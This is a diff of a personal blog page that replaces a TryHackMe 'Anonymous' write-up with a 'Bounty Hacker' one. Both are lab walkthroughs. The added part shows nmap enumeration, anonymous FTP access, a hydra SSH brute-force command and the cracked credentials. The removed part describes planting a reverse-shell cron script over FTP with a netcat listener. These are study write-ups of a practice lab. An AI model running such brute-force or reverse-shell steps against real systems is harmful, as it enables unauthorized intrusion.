@@ -8,14 +8,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Anonymous &middot; Nurimy&#39;s blog</title>
-  <meta name="title" content="Anonymous &middot; Nurimy&#39;s blog" />
+  <title>Bounty Hacker &middot; Nurimy&#39;s blog</title>
+  <meta name="title" content="Bounty Hacker &middot; Nurimy&#39;s blog" />
   
-  <meta name="description" content="Anonymous writeup (Medium)." />
+  <meta name="description" content="Basic Pentesting writeup (Easy)." />
   
   
   
-  <link rel="canonical" href="//localhost:1313/writeups/tryhackme/medium/anonymous/" />
+  <link rel="canonical" href="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/" />
   
   
   
@@ -65,22 +65,22 @@
   
   
   
-  <meta property="og:url" content="//localhost:1313/writeups/tryhackme/medium/anonymous/">
+  <meta property="og:url" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/">
   <meta property="og:site_name" content="Nurimy&#39;s blog">
-  <meta property="og:title" content="Anonymous">
-  <meta property="og:description" content="Anonymous writeup (Medium).">
+  <meta property="og:title" content="Bounty Hacker">
+  <meta property="og:description" content="Basic Pentesting writeup (Easy).">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
     <meta property="article:published_time" content="2024-06-15T00:00:00+00:00">
     <meta property="article:modified_time" content="2024-06-15T00:00:00+00:00">
-    <meta property="og:image" content="//localhost:1313/writeups/tryhackme/medium/anonymous/featured.png">
+    <meta property="og:image" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/featured.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="//localhost:1313/writeups/tryhackme/medium/anonymous/featured.png">
-  <meta name="twitter:title" content="Anonymous">
-  <meta name="twitter:description" content="Anonymous writeup (Medium).">
+  <meta name="twitter:image" content="//localhost:1313/writeups/tryhackme/easy/bounty-hacker/featured.png">
+  <meta name="twitter:title" content="Bounty Hacker">
+  <meta name="twitter:description" content="Basic Pentesting writeup (Easy).">
 
   
   <script type="application/ld+json">
@@ -88,12 +88,12 @@
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Writeups",
-    "name": "Anonymous",
-    "headline": "Anonymous",
-    "description": "Anonymous writeup (Medium).",
-    "abstract": "Enumeration In first place we\u0026rsquo;re doing a ping to check if the machine is running and to know the OS.",
+    "name": "Bounty Hacker",
+    "headline": "Bounty Hacker",
+    "description": "Basic Pentesting writeup (Easy).",
+    "abstract": "Enumeration Firstly, we\u0026rsquo;re doing a ping to see if the machine is running and to know the OS based on the ttl.",
     "inLanguage": "en",
-    "url" : "\/\/localhost:1313\/writeups\/tryhackme\/medium\/anonymous\/",
+    "url" : "\/\/localhost:1313\/writeups\/tryhackme\/easy\/bounty-hacker\/",
     "author" : {
       "@type": "Person",
       "name": "Nurimy"
@@ -107,7 +107,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "575"
+    "wordCount": "368"
   }]
   </script>
 
@@ -490,7 +490,7 @@
   <header id="single_header" class="mt-5 max-w-prose">
     
     <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-      Anonymous
+      Bounty Hacker
     </h1>
     <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
       
@@ -578,7 +578,7 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#anonymous-ftp">Anonymous FTP</a></li>
+    <li><a href="#ftp-anonymous-login--bruteforce">FTP Anonymous login &amp; Bruteforce</a></li>
     <li><a href="#privilege-escalation">Privilege escalation</a></li>
   </ul>
 </nav>
@@ -594,7 +594,7 @@
     <nav id="TableOfContents">
   <ul>
     <li><a href="#enumeration">Enumeration</a></li>
-    <li><a href="#anonymous-ftp">Anonymous FTP</a></li>
+    <li><a href="#ftp-anonymous-login--bruteforce">FTP Anonymous login &amp; Bruteforce</a></li>
     <li><a href="#privilege-escalation">Privilege escalation</a></li>
   </ul>
 </nav>
@@ -620,23 +620,31 @@
     
 </h2>
 <hr>
-<p>In first place we&rsquo;re doing a ping to check if the machine is running and to <strong>know the OS</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">113</span><span class="o">.</span><span class="mi">231</span>
+<p>Firstly, we&rsquo;re doing a ping to see if the machine is running and to know the <strong>OS based on the ttl</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ping</span> <span class="o">-</span><span class="n">c</span> <span class="mi">1</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
 </span></span></code></pre></div><p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/1.png" alt="Image 1" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/1_hu8601e99b7adbf8663f1d5277d1c88743_90296_660x0_resize_box_3.png"
+        alt="Image 1"
+      />
       
     </figure>
 </p>
-<p>Once we know that the machine is active, it&rsquo;s time to scan the ports and see the services that are running.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">113</span><span class="o">.</span><span class="mi">231</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Scan</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">113</span><span class="o">.</span><span class="mi">231</span>
-</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mo">062</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
-</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">65531</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">PORT</span>    <span class="no">STATE</span> <span class="no">SERVICE</span>     <span class="no">VERSION</span>
-</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ftp</span>         <span class="n">vsftpd</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">8</span> <span class="ow">or</span> <span class="n">later</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="ss">anon</span><span class="p">:</span> <span class="no">Anonymous</span> <span class="no">FTP</span> <span class="n">login</span> <span class="n">allowed</span> <span class="p">(</span><span class="no">FTP</span> <span class="n">code</span> <span class="mi">230</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_drwxrwxrwx</span>    <span class="mi">2</span> <span class="mi">111</span>      <span class="mi">113</span>          <span class="mi">4096</span> <span class="no">Jun</span> <span class="mo">04</span>  <span class="mi">2020</span> <span class="n">scripts</span> <span class="o">[</span><span class="ss">NSE</span><span class="p">:</span> <span class="n">writeable</span><span class="o">]</span>
+<p>Now that we know the machine is active it&rsquo;s time to scan it with nmap.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="n">nmap</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="n">sCV</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">--</span><span class="n">min</span><span class="o">-</span><span class="n">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="n">oN</span> <span class="no">Scan</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
+</span></span><span class="line"><span class="cl"><span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="mo">054</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="no">Not</span> <span class="ss">shown</span><span class="p">:</span> <span class="mi">55529</span> <span class="n">filtered</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">no</span><span class="o">-</span><span class="n">response</span><span class="p">),</span> <span class="mi">10003</span> <span class="n">closed</span> <span class="n">tcp</span> <span class="n">ports</span> <span class="p">(</span><span class="n">reset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="no">PORT</span>   <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
+</span></span><span class="line"><span class="cl"><span class="mi">21</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ftp</span>     <span class="n">vsftpd</span> <span class="mi">3</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="ss">syst</span><span class="p">:</span> 
 </span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">STAT</span><span class="p">:</span> 
 </span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="no">FTP</span> <span class="n">server</span> <span class="ss">status</span><span class="p">:</span>
@@ -647,127 +655,178 @@
 </span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Session</span> <span class="n">timeout</span> <span class="k">in</span> <span class="n">seconds</span> <span class="n">is</span> <span class="mi">300</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Control</span> <span class="n">connection</span> <span class="n">is</span> <span class="n">plain</span> <span class="n">text</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">Data</span> <span class="n">connections</span> <span class="n">will</span> <span class="n">be</span> <span class="n">plain</span> <span class="n">text</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">At</span> <span class="n">session</span> <span class="n">startup</span><span class="p">,</span> <span class="n">client</span> <span class="n">count</span> <span class="n">was</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="no">At</span> <span class="n">session</span> <span class="n">startup</span><span class="p">,</span> <span class="n">client</span> <span class="n">count</span> <span class="n">was</span> <span class="mi">2</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span>      <span class="n">vsFTPd</span> <span class="mi">3</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">3</span> <span class="o">-</span> <span class="n">secure</span><span class="p">,</span> <span class="n">fast</span><span class="p">,</span> <span class="n">stable</span>
 </span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_End</span> <span class="n">of</span> <span class="n">status</span>
-</span></span><span class="line"><span class="cl"><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>         <span class="no">OpenSSH</span> <span class="mi">7</span><span class="o">.</span><span class="mi">6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mi">2</span><span class="o">.</span><span class="mi">0</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">8</span><span class="ss">b</span><span class="p">:</span><span class="ss">ca</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">62</span><span class="p">:</span><span class="mi">1</span><span class="ss">c</span><span class="p">:</span><span class="mi">2</span><span class="ss">b</span><span class="p">:</span><span class="mi">23</span><span class="ss">:fa</span><span class="p">:</span><span class="mi">6</span><span class="ss">b</span><span class="p">:</span><span class="ss">c6</span><span class="p">:</span><span class="mi">1</span><span class="ss">f</span><span class="p">:</span><span class="ss">a8</span><span class="p">:</span><span class="mi">13</span><span class="ss">:fe</span><span class="p">:</span><span class="mi">1</span><span class="ss">c</span><span class="p">:</span><span class="mi">68</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">256</span> <span class="mi">95</span><span class="p">:</span><span class="mi">89</span><span class="ss">:a4</span><span class="p">:</span><span class="mi">12</span><span class="ss">:e2:e6:ab</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mi">5</span><span class="ss">d</span><span class="p">:</span><span class="mi">45</span><span class="p">:</span><span class="mi">19</span><span class="ss">:ff</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">5</span><span class="ss">f</span><span class="p">:</span><span class="mi">74</span><span class="ss">:ce</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="ss">e1</span><span class="p">:</span><span class="mi">2</span><span class="ss">a</span><span class="p">:</span><span class="mi">96</span><span class="ss">:a4:ea</span><span class="p">:</span><span class="mi">8</span><span class="ss">f</span><span class="p">:</span><span class="mi">68</span><span class="p">:</span><span class="mi">8</span><span class="ss">f</span><span class="p">:</span><span class="ss">cc</span><span class="p">:</span><span class="mi">74</span><span class="ss">:b8:f0</span><span class="p">:</span><span class="mi">28</span><span class="p">:</span><span class="mi">72</span><span class="p">:</span><span class="mi">70</span><span class="ss">:cd</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="no">Samba</span> <span class="n">smbd</span> <span class="mi">3</span><span class="o">.</span><span class="n">X</span> <span class="o">-</span> <span class="mi">4</span><span class="o">.</span><span class="n">X</span> <span class="p">(</span><span class="ss">workgroup</span><span class="p">:</span> <span class="no">WORKGROUP</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span> <span class="no">Samba</span> <span class="n">smbd</span> <span class="mi">4</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="no">Ubuntu</span> <span class="p">(</span><span class="ss">workgroup</span><span class="p">:</span> <span class="no">WORKGROUP</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">Host</span><span class="p">:</span> <span class="no">ANONYMOUS</span><span class="p">;</span> <span class="ss">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kernel
-</span></span></span><span class="line"><span class="cl"><span class="sr">
-</span></span></span><span class="line"><span class="cl"><span class="sr">Host script results:
-</span></span></span><span class="line"><span class="cl"><span class="sr">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-</span></span></span><span class="line"><span class="cl"><span class="sr">| smb-security-mode: 
-</span></span></span><span class="line"><span class="cl"><span class="sr">|   account_used: guest
-</span></span></span><span class="line"><span class="cl"><span class="sr">|   authentication_level: user
-</span></span></span><span class="line"><span class="cl"><span class="sr">|   challenge_response: supported
-</span></span></span><span class="line"><span class="cl"><span class="sr">|_  message_signing: disabled (dangerous, but default)
-</span></span></span><span class="line"><span class="cl"><span class="sr">| smb2-time: 
-</span></span></span><span class="line"><span class="cl"><span class="sr">|   date: 2024-06-15T09:56:02
-</span></span></span><span class="line"><span class="cl"><span class="sr">|_  start_date: N/</span><span class="n">A</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="ss">mode</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>    <span class="no">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="ss">discovery</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">OS</span><span class="p">:</span> <span class="no">Windows</span> <span class="mi">6</span><span class="o">.</span><span class="mi">1</span> <span class="p">(</span><span class="no">Samba</span> <span class="mi">4</span><span class="o">.</span><span class="mi">7</span><span class="o">.</span><span class="mi">6</span><span class="o">-</span><span class="no">Ubuntu</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="no">Computer</span> <span class="nb">name</span><span class="p">:</span> <span class="n">anonymous</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="no">NetBIOS</span> <span class="n">computer</span> <span class="nb">name</span><span class="p">:</span> <span class="no">ANONYMOUS</span><span class="p">\</span><span class="n">x00</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="no">Domain</span> <span class="nb">name</span><span class="p">:</span> <span class="p">\</span><span class="n">x00</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span>   <span class="ss">FQDN</span><span class="p">:</span> <span class="n">anonymous</span>
-</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_</span>  <span class="no">System</span> <span class="ss">time</span><span class="p">:</span> <span class="mi">2024</span><span class="o">-</span><span class="mo">06</span><span class="o">-</span><span class="mi">15</span><span class="ss">T09</span><span class="p">:</span><span class="mi">56</span><span class="p">:</span><span class="mo">02</span><span class="o">+</span><span class="mo">00</span><span class="p">:</span><span class="mo">00</span>
-</span></span></code></pre></div>
+</span></span><span class="line"><span class="cl"><span class="o">|</span> <span class="n">ftp</span><span class="o">-</span><span class="ss">anon</span><span class="p">:</span> <span class="no">Anonymous</span> <span class="no">FTP</span> <span class="n">login</span> <span class="n">allowed</span> <span class="p">(</span><span class="no">FTP</span> <span class="n">code</span> <span class="mi">230</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">|</span><span class="n">_Can</span><span class="s1">&#39;t get directory listing: TIMEOUT
+</span></span></span><span class="line"><span class="cl"><span class="s1">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="s1">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+</span></span></span><span class="line"><span class="cl"><span class="s1">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span></span><span class="line"><span class="cl"><span class="s1">|_http-title: Site doesn&#39;</span><span class="n">t</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="no">Service</span> <span class="ss">Info</span><span class="p">:</span> <span class="ss">OSs</span><span class="p">:</span> <span class="no">Unix</span><span class="p">,</span> <span class="no">Linux</span><span class="p">;</span> <span class="ss">CPE</span><span class="p">:</span> <span class="ss">cpe</span><span class="p">:</span><span class="sr">/o:linux:linux_kernel
+</span></span></span></code></pre></div>
 
-<h2 class="relative group">Anonymous FTP 
-    <div id="anonymous-ftp" class="anchor"></div>
+<h2 class="relative group">FTP Anonymous login &amp; Bruteforce 
+    <div id="ftp-anonymous-login--bruteforce" class="anchor"></div>
     
 </h2>
 <hr>
-<p>Nmap has detected <strong>anonymous login</strong> in the FTP server so let&rsquo;s check what&rsquo;s there.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">113</span><span class="o">.</span><span class="mi">231</span>
-</span></span></code></pre></div><p>To enter with an anonymous session in FTP, we should provide the user <strong>anonymous</strong> and a <strong>blank password</strong>.</p>
+<p>In the scan results, it looks like the machine has <strong>FTP Anonymous login</strong>. We can log in with <strong>anonymous</strong> with a blank password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>
+</span></span></code></pre></div><p>There are two files:</p>
 <p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/2.png" alt="Image 2" />
-      
-    </figure>
-
-To list the FTP server content, we can use dir and ls.</p>
-<p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/3.png" alt="Image 3" />
-      
-    </figure>
-</p>
-<p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/4.png" alt="Image 4" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/2_huf6ae112209944b0bfbe107e10afda644_141072_660x0_resize_box_3.png"
+        alt="Image 2"
+      />
       
     </figure>
 </p>
-<p>In scripts there are some files, a &ldquo;log file&rdquo;, a to do file and a <strong>bash script</strong>.</p>
+<p>In task.txt we have the user lin who made the note.</p>
 <p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/5.png" alt="Image 5" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/3_hu2f7dc365dc0cc66a45546548c79a5b20_45116_660x0_resize_box_3.png"
+        alt="Image 3"
+      />
       
     </figure>
 </p>
-<p>The script checks if is something in the <strong>/tmp folder</strong> and the server should be executing it <strong>every x time</strong>. In order to try that we can modify the script and upload it again in replacing the actual script.</p>
+<p>And ind locks.txt, we have a password wordlist.</p>
 <p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/6.png" alt="Image 6" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/4_hu491ae01df8f0629db1739e70a5220f03_163386_660x0_resize_box_3.png"
+        alt="Image 4"
+      />
       
     </figure>
 </p>
-<p>This &ldquo;special&rdquo; script does a <strong>TCP connection</strong> using built-in linux sockets.Just in case, we prepare a netcat listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">443</span>
-</span></span></code></pre></div><p>Now that&rsquo;s all ready, we enter the server and upload the &ldquo;special&rdquo; script replacing the original with <strong>put</strong>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">ftp</span> <span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">113</span><span class="o">.</span><span class="mi">231</span>
-</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">scripts</span> 
-</span></span><span class="line"><span class="cl"><span class="n">put</span> <span class="n">clean</span><span class="o">.</span><span class="n">sh</span>
-</span></span></code></pre></div><p>And we&rsquo;got the reverse shell.</p>
-<p>
+<p>In order to do the <strong>bruteforce attack</strong>, we&rsquo;re using hydra.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">lin</span> <span class="o">-</span><span class="n">P</span> <span class="n">locks</span><span class="o">.</span><span class="n">txt</span> <span class="ss">ssh</span><span class="p">:</span><span class="sr">//</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">12</span><span class="o">.</span><span class="mi">22</span>  
+</span></span></code></pre></div><p>
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="./img/7.png" alt="Image 7" />
+      <img
+        class="my-0 rounded-md"
+        loading="lazy"
+        srcset="
+        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_330x0_resize_box_3.png 330w,
+        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_660x0_resize_box_3.png 660w,
+        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_1024x0_resize_box_3.png 1024w,
+        /writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_1320x0_resize_box_3.png 2x"
+        src="/writeups/tryhackme/easy/bounty-hacker/img/5_hub98c77305ce7fff77f2ac22c09459796_302691_660x0_resize_box_3.png"
+        alt="Image 5"
+      />
       
     </figure>
 </p>
-
+<p>Hydra found the credentials <strong>lin:RedDr4gonSynd1cat3</strong>.</p>
